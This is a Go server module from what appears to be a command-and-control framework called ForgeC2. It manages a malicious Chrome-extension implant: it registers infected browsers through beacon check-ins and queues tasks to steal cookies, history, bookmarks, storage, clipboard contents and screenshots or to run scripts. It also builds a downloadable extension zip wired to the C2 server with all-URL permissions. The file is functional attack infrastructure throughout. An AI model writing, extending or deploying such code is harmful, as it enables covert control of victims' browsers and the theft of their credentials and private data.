package server

import (
	"archive/zip"
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
	"gorm.io/gorm/clause"
)

var chromeTaskTypes = map[string]bool{
	protocol.TaskTypeChromeC2:         true,
	protocol.TaskTypeChromeExec:       true,
	protocol.TaskTypeChromeScript:     true,
	protocol.TaskTypeChromeCookies:    true,
	protocol.TaskTypeChromeBookmarks:  true,
	protocol.TaskTypeChromeHistory:    true,
	protocol.TaskTypeChromeTabs:       true,
	protocol.TaskTypeChromeDownload:   true,
	protocol.TaskTypeChromeStorage:    true,
	protocol.TaskTypeChromeScreenshot: true,
	protocol.TaskTypeChromeClipboard:  true,
	protocol.TaskTypeChromeIdle:       true,
}

// chromeAgent is the JSON shape expected by the Chrome C2 frontend page.
type chromeAgent struct {
	UUID     string `json:"uuid"`
	Hostname string `json:"hostname"`
	Platform string `json:"platform"`
	Language string `json:"language"`
	Browser  string `json:"browser"`
	LastSeen string `json:"last_seen"`
	Status   string `json:"status"`
}

type chromeBeaconRequest struct {
	UUID    string            `json:"uuid"`
	Info    map[string]string `json:"info"`
	Results []taskResult      `json:"results"`
}

type chromeWireTask struct {
	ID      uint   `json:"id"`
	Type    string `json:"type"`
	Command string `json:"command,omitempty"`
	Path    string `json:"path,omitempty"`
	Data    string `json:"data,omitempty"`
	Details string `json:"details,omitempty"`
	Query   string `json:"query,omitempty"`
	URL     string `json:"url,omitempty"`
}

// handleChromeAgents returns the list of Chrome (browser extension) C2 agents.
// Browser-extension agents are tracked as implants tagged "chrome"; if none
// exist we return an empty list so the UI renders its "no agents" state.
func (s *Server) handleChromeAgents(c *gin.Context) {
	var agents []db.Implant
	if err := s.db.Where("tags LIKE ?", "%chrome%").Order("last_seen desc").Limit(500).Find(&agents).Error; err != nil {
		respondError(c, http.StatusInternalServerError, "database error")
		return
	}

	out := make([]chromeAgent, 0, len(agents))
	for _, a := range agents {
		lastSeen := ""
		if !a.LastSeen.IsZero() {
			lastSeen = a.LastSeen.Format(time.RFC3339)
		}
		out = append(out, chromeAgent{
			UUID:     a.ID,
			Hostname: a.Hostname,
			Platform: a.OS,
			Language: a.Username,
			Browser:  firstNonEmpty(a.ProcessName, "Chrome"),
			LastSeen: lastSeen,
			Status:   a.Status,
		})
	}

	respond(c, gin.H{"agents": out})
}

// handleChromeAgentTask dispatches a task to a Chrome extension agent.
func (s *Server) handleChromeAgentTask(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	uuid := c.Param("uuid")

	var req struct {
		Type    string `json:"type"`
		Command string `json:"command"`
		Path    string `json:"path"`
		Data    string `json:"data"`
		Details string `json:"details"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}

	var agent db.Implant
	if !s.findOrFail(c, &agent, uuid, "agent") {
		return
	}

	taskType := req.Type
	if taskType == "" {
		taskType = protocol.TaskTypeChromeExec
	}

	if !chromeTaskTypes[taskType] {
		respondError(c, http.StatusBadRequest, "invalid chrome task type: "+taskType)
		return
	}

	command := req.Command
	if req.Details != "" && command == "" {
		command = req.Details
	}

	task, err := s.createTask(uuid, taskType, command, "", req.Path, req.Data, 0, 0, callerOpts(c)...)
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}

	s.broadcastTaskUpdate(uuid, *task)
	respond(c, gin.H{"success": true, "task_id": task.ID})
}

// handleChromeBeacon is the public check-in for the browser-extension agent.
// It registers/updates a chrome-tagged implant, applies task results, and
// returns pending chrome_* tasks. CSRF/session auth is skipped (same contract
// as /api/v1/beacon); optional token binding uses a derived chrome token when
// server.beacon_key is configured.
func (s *Server) handleChromeBeacon(c *gin.Context) {
	if !s.checkChromeBeaconToken(c) {
		respondError(c, http.StatusUnauthorized, "invalid chrome beacon token")
		return
	}

	var req chromeBeaconRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if !isValidAgentID(req.UUID) {
		respondError(c, http.StatusBadRequest, "invalid agent id")
		return
	}

	now := time.Now()
	agent, ok := s.upsertChromeAgent(req, c.ClientIP(), now)
	if !ok {
		respondError(c, http.StatusForbidden, "agent rejected")
		return
	}

	if len(req.Results) > 0 {
		s.processTaskResults(agent, req.Results, req.UUID, now)
	}

	tasks := s.fetchPendingChromeTasks(req.UUID)
	respond(c, gin.H{"success": true, "tasks": tasks})
}

func (s *Server) checkChromeBeaconToken(c *gin.Context) bool {
	want := s.chromeExtensionToken()
	if want == "" {
		return true
	}
	got := c.GetHeader("X-ForgeC2-Chrome-Token")
	if got == "" {
		got = c.GetHeader("X-Chrome-Token")
	}
	return hmac.Equal([]byte(got), []byte(want))
}

func (s *Server) chromeExtensionToken() string {
	if s.cfg == nil || s.cfg.Server.BeaconKey == "" {
		return ""
	}
	key, err := hex.DecodeString(s.cfg.Server.BeaconKey)
	if err != nil || len(key) == 0 {
		key = []byte(s.cfg.Server.BeaconKey)
	}
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte("forgec2-chrome-c2"))
	return hex.EncodeToString(mac.Sum(nil)[:16])
}

func (s *Server) upsertChromeAgent(req chromeBeaconRequest, publicIP string, now time.Time) (db.Implant, bool) {
	info := req.Info
	if info == nil {
		info = map[string]string{}
	}
	hostname := firstNonEmpty(info["hostname"], info["platform"], "chrome-extension")
	browser := firstNonEmpty(info["browser"], "Chrome")
	language := info["language"]
	platform := firstNonEmpty(info["platform"], "chrome")

	var agent db.Implant
	err := s.db.Unscoped().Where("id = ?", req.UUID).First(&agent).Error
	if err != nil && err != gorm.ErrRecordNotFound {
		slog.Error("chrome beacon lookup failed", "agent_id", req.UUID, "err", err)
		return db.Implant{}, false
	}

	if err == nil {
		if agent.Blocked {
			s.db.Model(&db.Implant{}).Where("id = ?", agent.ID).Update("status", "offline")
			s.LogAuditRecord(nil, "blocked_agent_checkin", "agent", agent.ID,
				"blocked chrome implant attempted check-in"+blockedReasonSuffix(agent.BlockedReason), false, nil)
			return db.Implant{}, false
		}
		if agent.DeletedAt.Valid {
			s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", agent.ID).Update("deleted_at", nil)
			agent.DeletedAt = gorm.DeletedAt{}
		}
		updates := map[string]interface{}{
			"last_seen":    now,
			"status":       "online",
			"hostname":     hostname,
			"os":           platform,
			"username":     language,
			"process_name": browser,
			"public_ip":    publicIP,
		}
		if !strings.Contains(agent.Tags, "chrome") {
			updates["tags"] = mergeTags(agent.Tags, "chrome")
		}
		if uerr := s.db.Model(&db.Implant{}).Where("id = ?", agent.ID).Updates(updates).Error; uerr != nil {
			slog.Error("chrome beacon update failed", "agent_id", agent.ID, "err", uerr)
			return db.Implant{}, false
		}
		agent.LastSeen = now
		agent.Status = "online"
		agent.Hostname = hostname
		agent.Tags = mergeTags(agent.Tags, "chrome")
		return agent, true
	}

	agent = db.Implant{
		ID:          req.UUID,
		TenantID:    s.defaultTenantID(),
		Hostname:    hostname,
		Username:    language,
		OS:          platform,
		Arch:        platform,
		IP:          publicIP,
		PublicIP:    publicIP,
		LastSeen:    now,
		Status:      "online",
		Tags:        "chrome",
		ProcessName: browser,
		Version:     firstNonEmpty(info["version"], "chrome-ext"),
	}
	if cerr := s.db.Create(&agent).Error; cerr != nil {
		if rerr := s.db.Unscoped().Where("id = ?", req.UUID).First(&agent).Error; rerr != nil {
			slog.Error("chrome agent create failed", "agent_id", req.UUID, "err", cerr)
			return db.Implant{}, false
		}
		return agent, true
	}
	slog.Info("New chrome extension agent registered", "agent_id", agent.ID, "platform", platform)
	s.broadcastAgentOnline(agent, true)
	s.recordAgentStatusEvent(agent.ID, "online")
	return agent, true
}

func (s *Server) fetchPendingChromeTasks(uuid string) []chromeWireTask {
	var claimed []db.Task
	if err := s.db.Transaction(func(tx *gorm.DB) error {
		var pending []db.Task
		if err := tx.Clauses(clause.Locking{Strength: "UPDATE"}).
			Where("agent_id = ? AND status = ? AND type LIKE ?", uuid, "pending", "chrome_%").
			Order("priority DESC, created_at ASC").
			Limit(BeaconTaskFetchLimit).
			Find(&pending).Error; err != nil {
			return err
		}
		if len(pending) == 0 {
			return nil
		}
		ids := make([]uint, len(pending))
		for i, t := range pending {
			ids[i] = t.ID
		}
		result := tx.Model(&db.Task{}).
			Where("id IN ? AND status = ?", ids, "pending").
			Updates(map[string]interface{}{
				"status":     "running",
				"claimed_by": uuid,
				"claimed_at": time.Now(),
			})
		if result.Error != nil {
			return result.Error
		}
		if result.RowsAffected != int64(len(ids)) {
			return fmt.Errorf("chrome task claim conflict for agent %s", uuid)
		}
		return tx.Where("id IN ?", ids).Order("priority DESC, created_at ASC").Find(&claimed).Error
	}); err != nil {
		slog.Error("Failed to claim chrome tasks", "agent_id", uuid, "error", err)
		return []chromeWireTask{}
	}

	out := make([]chromeWireTask, 0, len(claimed))
	for _, t := range claimed {
		wt := chromeWireTask{
			ID:      t.ID,
			Type:    t.Type,
			Command: t.Command,
			Path:    t.Path,
			Data:    t.Data,
			Details: t.Command,
			Query:   t.Command,
			URL:     t.Command,
		}
		out = append(out, wt)
	}
	return out
}

// handleChromeExtensionZip packages the browser-extension agent with this
// server's origin substituted for the <C2_SERVER> placeholder.
func (s *Server) handleChromeExtensionZip(c *gin.Context) {
	base := s.chromeC2BaseURL(c)
	token := s.chromeExtensionToken()
	zipBytes, err := s.buildChromeExtensionZip(base, token)
	if err != nil {
		slog.Error("chrome extension zip failed", "err", err)
		respondError(c, http.StatusServiceUnavailable, err.Error())
		return
	}
	c.Header("Content-Disposition", `attachment; filename="forgec2-chrome-c2.zip"`)
	c.Data(http.StatusOK, "application/zip", zipBytes)
}

func (s *Server) chromeC2BaseURL(c *gin.Context) string {
	scheme := "http"
	if c.Request.TLS != nil || (s.cfg != nil && s.cfg.Server.TLSEnabled) {
		scheme = "https"
	}
	host := c.Request.Host
	if host == "" && s.cfg != nil {
		host = fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Server.Port)
	}
	if host == "" {
		host = "127.0.0.1:8000"
	}
	return scheme + "://" + strings.TrimRight(host, "/")
}

func (s *Server) buildChromeExtensionZip(c2Base, token string) ([]byte, error) {
	files, err := loadChromeExtensionFiles()
	if err != nil {
		return nil, err
	}
	c2Base = strings.TrimRight(c2Base, "/")
	replacer := strings.NewReplacer(
		"<C2_SERVER>", c2Base,
		"<C2_TOKEN>", token,
	)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, data := range files {
		w, err := zw.Create(name)
		if err != nil {
			zw.Close()
			return nil, err
		}
		payload := data
		if strings.HasSuffix(name, ".js") || strings.HasSuffix(name, ".json") || strings.HasSuffix(name, ".html") {
			payload = []byte(replacer.Replace(string(data)))
			if name == "manifest.json" {
				payload = patchChromeManifestHostPerms(payload, c2Base)
			}
		}
		if _, err := w.Write(payload); err != nil {
			zw.Close()
			return nil, err
		}
	}
	if err := zw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func patchChromeManifestHostPerms(raw []byte, c2Base string) []byte {
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		return raw
	}
	m["host_permissions"] = []string{"<all_urls>", c2Base + "/*"}
	out, err := json.MarshalIndent(m, "", "  ")
	if err != nil {
		return raw
	}
	return out
}

func loadChromeExtensionFiles() (map[string][]byte, error) {
	roots := chromeExtensionSearchRoots()
	for _, root := range roots {
		entries, err := os.ReadDir(root)
		if err != nil {
			continue
		}
		files := map[string][]byte{}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			switch strings.ToLower(filepath.Ext(name)) {
			case ".js", ".json", ".html", ".png":
			default:
				continue
			}
			if name == "build.ps1" {
				continue
			}
			data, err := os.ReadFile(filepath.Join(root, name))
			if err != nil {
				continue
			}
			files[name] = data
		}
		if _, ok := files["background.js"]; ok {
			if _, hasIcon := files["icon.png"]; !hasIcon {
				files["icon.png"] = chromePlaceholderIconPNG()
			}
			return files, nil
		}
	}
	return nil, fmt.Errorf("chrome extension sources not found (looked in %s); place extensions/chrome next to the server", strings.Join(roots, ", "))
}

func chromeExtensionSearchRoots() []string {
	var roots []string
	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		roots = append(roots,
			filepath.Join(dir, "extensions", "chrome"),
			filepath.Join(dir, "chrome-ext"),
		)
	}
	if cwd, err := os.Getwd(); err == nil {
		roots = append(roots,
			filepath.Join(cwd, "extensions", "chrome"),
			filepath.Join(cwd, "..", "extensions", "chrome"),
		)
	}
	return uniqueStrings(roots)
}

func uniqueStrings(in []string) []string {
	seen := map[string]struct{}{}
	out := make([]string, 0, len(in))
	for _, s := range in {
		if s == "" {
			continue
		}
		clean := filepath.Clean(s)
		if _, ok := seen[clean]; ok {
			continue
		}
		seen[clean] = struct{}{}
		out = append(out, clean)
	}
	return out
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return ""
}

func mergeTags(existing, add string) string {
	parts := strings.Split(existing, ",")
	have := map[string]struct{}{}
	var out []string
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if _, ok := have[p]; ok {
			continue
		}
		have[p] = struct{}{}
		out = append(out, p)
	}
	add = strings.TrimSpace(add)
	if add != "" {
		if _, ok := have[add]; !ok {
			out = append(out, add)
		}
	}
	return strings.Join(out, ",")
}

func chromePlaceholderIconPNG() []byte {
	// Minimal 1x1 PNG so unpacked installs do not fail on a missing icon.
	b, err := hex.DecodeString("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c63000100000500010d0a2db40000000049454e44ae426082")
	if err != nil {
		return nil
	}
	return b
}
